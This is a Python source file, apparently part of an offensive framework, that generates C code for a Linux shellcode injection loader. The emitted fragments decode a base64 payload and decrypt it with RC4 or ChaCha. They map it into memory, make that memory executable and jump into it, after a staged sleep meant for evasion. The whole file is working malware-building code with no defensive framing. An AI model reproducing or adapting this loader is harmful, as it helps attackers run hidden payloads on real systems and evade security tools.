#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Shared C preamble/decryption for Linux injection loaders."""

from __future__ import annotations

from lib.compile.syscall_evasion import SyscallEvasionBuilder, _to_c_string


class LinuxInjectionBuilder(SyscallEvasionBuilder):
    """Encrypt shellcode and emit Linux mmap-based decode/decrypt fragments."""

    def decrypt_block(self, key: bytes, iv=None, *, dest: str = "shellcode_buf") -> str:
        if self.cipher == "rc4":
            return f"""
            {_to_c_string(key, "key")}
            RC4(key, decoded, {dest}, payload_size);
"""
        if iv is None:
            raise ValueError("iv is required for chacha cipher")
        return f"""
            {_to_c_string(key, "key")}
            {_to_c_string(iv, "iv")}
            chacha_ctx ctx;
            chacha_keysetup(&ctx, key, 256, 96);
            chacha_ivsetup(&ctx, iv);
            chacha_encrypt_bytes(&ctx, decoded, {dest}, (unsigned long)payload_size);
"""

    def sleep_block(self) -> str:
        if self.sleep_ms <= 0:
            return ""
        return f"for (int i = 0; i < 10; i++) {{ usleep(({self.sleep_ms} / 10) * 1000); }}"

    def decode_preamble(self, encoded_var: str = "enc_payload") -> str:
        return f"""
    int enc_len = (int)strlen({encoded_var});
    unsigned char *decoded = (unsigned char *)malloc((size_t)enc_len);
    if (!decoded) return 1;
    int payload_size = base64decode(decoded, {encoded_var}, enc_len);
    if (payload_size <= 0) return 1;
    unsigned char *shellcode_buf = (unsigned char *)mmap(
        NULL, (size_t)payload_size, PROT_READ | PROT_WRITE,
        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (shellcode_buf == MAP_FAILED) return 1;
"""

    def headers(self) -> list[str]:
        items = [
            "#define _GNU_SOURCE",
            "#include <stdint.h>",
            "#include <stdio.h>",
            "#include <stdlib.h>",
            "#include <string.h>",
            "#include <unistd.h>",
            "#include <sys/mman.h>",
            '#include "base64.h"',
        ]
        if self.cipher == "rc4":
            items.append('#include "rc4.h"')
        else:
            items.append('#include "chacha.h"')
        return items

    def exec_shellcode_block(self, var: str = "shellcode_buf", size_var: str = "payload_size") -> str:
        return f"""
    if (mprotect({var}, (size_t){size_var}, PROT_READ | PROT_EXEC) != 0) return 1;
    {self.sleep_block()}
    ((void (*)(void)){var})();
"""

    def cleanup_block(self, var: str = "shellcode_buf", size_var: str = "payload_size") -> str:
        return f"""
    munmap({var}, (size_t){size_var});
    free(decoded);
"""
